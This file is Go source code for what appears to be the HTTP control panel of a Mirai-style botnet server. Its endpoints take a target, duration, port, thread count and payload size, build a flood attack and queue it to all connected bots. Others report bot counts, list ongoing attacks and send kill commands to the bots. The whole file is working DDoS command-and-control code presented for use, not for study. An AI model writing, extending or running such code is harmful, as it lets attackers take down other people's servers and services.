package main
import (
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"strings"
)

type Api struct {
	clientList *ClientList
	port       string
}

func NewApi(conn net.Conn) *Api {
	return &Api{
		clientList: clientList,
		port:       "3333",
	}
}

func (this *Api) Handle() {
	http.HandleFunc("/api/attack", this.handleAttack)
	http.HandleFunc("/api/status", this.handleStatus)
	http.HandleFunc("/api/ongoing", this.handleOngoing)
	http.HandleFunc("/api/killport", this.handleKillPort)
	http.HandleFunc("/api/killbot", this.handleKillBot)

	if err := http.ListenAndServe(":"+this.port, nil); err != nil {
		fmt.Printf("HTTP API error: %v\n", err)
	}
}

func (this *Api) handleAttack(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	params := r.URL.Query()

	cmd := params.Get("cmd")
	target := params.Get("target")
	duration := params.Get("duration")

	if cmd == "" || target == "" || duration == "" {
		http.Error(w, "Missing required parameters", http.StatusBadRequest)
		return
	}


	command := fmt.Sprintf("%s %s %s", cmd, target, duration)

	if port := params.Get("port"); port != "" {
		command += fmt.Sprintf(" port=%s", port)
	}
	if threads := params.Get("threads"); threads != "" {
		command += fmt.Sprintf(" conns=%s", threads)
	}
	if payload := params.Get("payload"); payload != "" {
		command += fmt.Sprintf(" payload=%s", payload)
	}
	if size := params.Get("size"); size != "" {
		command += fmt.Sprintf(" size=%s", size)
	}

	atk, err := NewAttack(command, 1)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error creating attack: %v", err), http.StatusBadRequest)
		return
	}

	botCount := this.clientList.Count()

	can, err := database.CanLaunchAttack("root", atk.Duration, command, botCount, 0)
	if !can {
		http.Error(w, fmt.Sprintf("Cannot launch attack: %v", err), http.StatusBadRequest)
		return
	}

	// ตรวจสอบ whitelist
	if database.ContainsWhitelistedTargets(atk) {
		http.Error(w, "Target is whitelisted", http.StatusForbidden)
		return
	}

	buf, err := atk.Build()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error building attack: %v", err), http.StatusInternalServerError)
		return
	}

	this.clientList.cntMutex.Lock()
	this.clientList.QueueBuf(buf, botCount, "")
	this.clientList.cntMutex.Unlock()

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Attack command sent to %d bots: %s\n", botCount, command)
}

func (this *Api) handleStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	botCount := this.clientList.Count()
	distribution := this.clientList.Distribution()

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Active bots: %d\n", botCount)
	fmt.Fprintf(w, "\nBot Distribution:\n")
	for source, count := range distribution {
		fmt.Fprintf(w, "%s: %d\n", source, count)
	}
}

func (this *Api) handleKillBot(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	command := "killbot" 

	atk, err := NewAttack(command, 1)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error creating attack: %v", err), http.StatusBadRequest)
		return
	}

	buf, err := atk.Build()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error building attack: %v", err), http.StatusInternalServerError)
		return
	}

	this.clientList.cntMutex.Lock()
	botCount := this.clientList.Count()
	this.clientList.QueueBuf(buf, botCount, "")
	this.clientList.cntMutex.Unlock()
	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Kill command sent to %d bots\n", botCount)
}

func (this *Api) handleOngoing(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	attacks := database.GetOngoingAttacks()

	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)

	fmt.Fprintf(w, "%-10s %-15s %-6s %-8s %-8s %-10s\n",
		"Method", "     Target", "     Port", "     Duration", "     TimeLeft", "     User")
	fmt.Fprintln(w, strings.Repeat("-", 80))

	for _, attack := range attacks {
		port := "-"
		if p, ok := attack["port"]; ok {
			port = fmt.Sprintf("%v", p)
		}

		fmt.Fprintf(w, "%-10s  %-15s     %-6s       %-8d      %-8d    %-10s\n",
			attack["method"],
			attack["target"],
			port,
			attack["duration"],
			attack["time_left"],
			attack["username"])
	}
}

func (this *Api) handleKillPort(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	atk := &Attack{
		Duration: 0,
		Type:     16,
		Targets:  map[uint32]uint8{binary.BigEndian.Uint32(net.ParseIP("255.255.255.255").To4()): 32},
		Flags:    make(map[uint8]string),
	}

	buf, err := atk.Build()
	if err != nil {
		http.Error(w, fmt.Sprintf("Error building command: %v", err), http.StatusInternalServerError)
		return
	}

	this.clientList.cntMutex.Lock()
	botCount := this.clientList.Count()
	this.clientList.QueueBuf(buf, botCount, "")
	this.clientList.cntMutex.Unlock()

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "%d\n", botCount)
}
